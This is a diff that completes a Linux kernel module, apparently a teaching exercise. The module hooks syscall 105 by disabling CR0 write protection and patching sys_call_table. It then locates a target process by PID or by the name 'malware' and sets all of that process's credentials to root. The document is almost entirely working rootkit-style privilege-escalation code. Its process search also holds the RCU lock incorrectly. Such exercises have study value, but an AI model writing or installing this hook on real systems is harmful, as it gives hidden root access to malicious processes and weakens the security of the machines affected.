@@ -9,6 +9,9 @@
 #include <linux/pid.h>
 #include <linux/pid_namespace.h>
 #include <asm/cacheflush.h>
+#include <linux/sched/signal.h>
+#include <linux/rcupdate.h>
+#include <linux/string.h>
 
 #define TARGET_PROC_NAME "malware"
 #define __NR_syscall 105
@@ -47,7 +50,25 @@ static long sys_mycall(uid_t uid)
 {
     if (target_task && current == target_task) {
         /* TODO: create new credentials and set UID/GID to 0 */
+        struct cred *new;
+
+        new = prepare_creds();
+        if (!new)
+            return -ENOMEM;
+
+        new->uid   = KUIDT_INIT(0);
+        new->gid   = KGIDT_INIT(0);
+        new->euid  = KUIDT_INIT(0);
+        new->egid  = KGIDT_INIT(0);
+        new->suid  = KUIDT_INIT(0);
+        new->sgid  = KGIDT_INIT(0);
+        new->fsuid = KUIDT_INIT(0);
+        new->fsgid = KGIDT_INIT(0);
+
+        commit_creds(new);
+
         return 0;
+
     }
 
     return anything_saved(uid);
@@ -56,13 +77,51 @@ static long sys_mycall(uid_t uid)
 /* Find target process */
 static int find_target_process(void)
 {
+    struct pid *pid;
+    struct task_struct *p;
     if (target_pid > 0) {
         /* TODO: find process by PID and assign target_task */
         if (target_task)
             return 0;
+
+        rcu_read_lock();
+        pid = find_get_pid(target_pid);
+        if(pid)
+        {
+            
+            p = pid_task(pid, PIDTYPE_PID);
+            if(p)
+            {
+                get_task_struct(p);
+                target_task = p;
+                put_pid(pid);
+                rcu_read_unlock();
+                printk(KERN_INFO "Found target process: %s (PID: %d)\n", target_task->comm, task_pid_nr(target_task));
+                return 0;
+            }
+            put_pid(pid);
+        }
+        rcu_read_unlock();
+        return -ESRCH;
+    }
+    /* TODO: find process by name if PID not specified */
+    else
+    {
+        for_each_process(p)
+        {
+            if (strcmp(p->comm, TARGET_PROC_NAME) == 0) 
+            {
+                rcu_read_lock();
+                get_task_struct(p);
+                target_task = p;
+                rcu_read_unlock();
+                printk(KERN_INFO "Found target process: %s (PID: %d)\n", target_task->comm, task_pid_nr(target_task));
+                return 0;
+            }
+        }
     }
 
-    /* TODO: find process by name if PID not specified */
+
     return -ESRCH;
 }
 
@@ -81,6 +140,9 @@ static int __init init_hook(void)
     anything_saved = (long (*)(uid_t))sys_call_table[__NR_syscall];
 
     /* TODO: disable write protection and replace syscall */
+    orig_cr0 = clear_and_return_cr0();
+    sys_call_table[__NR_syscall] = (unsigned long)sys_mycall;
+    setback_cr0(orig_cr0);
     
     printk(KERN_INFO "Installed hook for syscall %d\n", __NR_syscall);
     return 0;
@@ -90,6 +152,21 @@ static int __init init_hook(void)
 static void __exit exit_hook(void)
 {
     /* TODO: restore original syscall */
+    if (sys_call_table && anything_saved) {
+        /* 暂时关闭写保护 */
+        orig_cr0 = clear_and_return_cr0();
+
+        /* 把 syscall 表项改回去 */
+        sys_call_table[__NR_syscall] = (unsigned long)anything_saved;
+
+        /* 恢复 CR0 写保护 */
+        setback_cr0(orig_cr0);
+    }
+
+    if (target_task) {
+        put_task_struct(target_task);
+        target_task = NULL;
+    }
 
     printk(KERN_INFO "HookSyscall Module Unloaded\n");
 }
